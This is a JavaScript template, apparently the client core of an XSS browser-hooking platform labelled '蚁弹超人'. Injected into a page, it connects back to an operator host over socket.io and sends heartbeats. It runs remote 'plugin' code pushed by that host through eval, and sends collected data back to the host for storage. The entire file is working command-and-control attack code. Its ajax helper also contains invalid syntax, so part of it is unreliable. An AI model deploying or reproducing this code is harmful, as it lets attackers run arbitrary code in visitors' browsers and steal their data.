(function(ANT) {ANT.init#{PROJECT}})({
    //
    //= 蚁弹超人核心API
    //
    //- 配置选项
    //
    config: {
        host: 'http://#{HOST}'
    },
    //
    //- 初始化函数
    //
    init: function(fn, timeout) {
        var self = this,
            api  = new self.API();
        //@ 防止恶意反击，设定上线时间
        setTimeout(function() {
            //@ 加载socket.io.js
            api.loadJS(self.config.host + '/ant/js/socket.io.min.js', function() {
                //@ 连接服务器
                api.socket = io.connect(self.config.host);
                api.socket.on('connect', function() {
                    //= 初始化连接事件
                    this.emit('server', #{PID});
                }).on('disconnect', function() {
                    //= 断开连接事件
                    this.close();
                }).on('init', function(data) {
                    //= 连接成功，定时心跳
                    setInterval(function() {
                        api.socket.emit('alive', true);
                    }, 1000 * 10);
                    fn ? fn(api) : null;
                })
                .on('plugin-sender', function(ret) {
                    if (typeof(ret) !== 'object' || !ret.act || !ret.data) {
                        return false;
                    };
                    switch(ret.act) {
                        case 'inject':
                            var plugin = eval(ret.data);
                            plugin(api);
                            break;
                    }
                })
            })
        }, timeout || 0);
    },
    //
    //= API对象
    //
    API: function() {
        return {
            //
            //- socket对象
            //
            socket: null,
            //
            //- 加载JS资源函数
            //
            loadJS: function(js, fn) {
                var obj = document.createElement('script');
                obj.src = js;
                obj.readyState ? obj.onreadystatechange = function() {
                    (obj.readyState === 'loaded' || obj.readyState === 'complete') ? fn() : null;
                } : obj.onload = fn;
                document.head.appendChild(obj);
                return this;
            },
            //
            //- 监听服务端发来数据
            //
            listen: function(fn) {
                this.end();
                this.socket.on('plugin-listener', fn);
                return this;
            },
            //
            //- 返回插件数据
            //
            send: function(data) {
                this.socket.emit('plugin-sender', data);
                return this;
            },
            //
            //- 保存数据
            //
            save: function(data, line) {
                var _data = typeof(data) === 'string' ? data : (typeof(data) === 'object' ? JSON.stringify(data) : String(data));
                _data += line ? '' : '\n';
                this.socket.emit('save', _data);
                return this;
            },
            //- 保存&发送数据
            ss: function(data) {
                this.send(data).save(data);
            },
            //- 删除监听事件
            end: function() {
                this.socket.removeEventListener('plugin-listener');
            },
            //- Ajax
            ajax: function(url, params, callback) {
                var xhr = new (window.XMLHttpRequest || new ActiveXObject('MSXML2.XMLHTTP'))();
                (typeof(params) === 'object')
                ? ((xhr.open('post', url) && xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'))
                : ((xhr.open('get', url) && callback = params && params = null));
                xhr.onreadystatechange = function() {
                    ((this.readyState === 4) && callback) ? callback(this) : null;
                }
                xhr.send(params);
            }
        };
    }
});